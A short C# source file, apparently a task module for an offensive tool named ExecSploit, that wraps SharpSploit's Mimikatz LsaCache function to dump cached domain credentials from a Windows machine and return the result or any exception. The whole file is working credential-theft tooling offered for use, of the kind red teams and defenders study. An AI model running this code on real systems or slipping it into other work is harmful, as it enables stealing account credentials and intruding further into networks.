using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class LsaCache
    {
        public static string Execute()
        {
            try
            {
                return SharpSploit.Credentials.Mimikatz.LsaCache();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}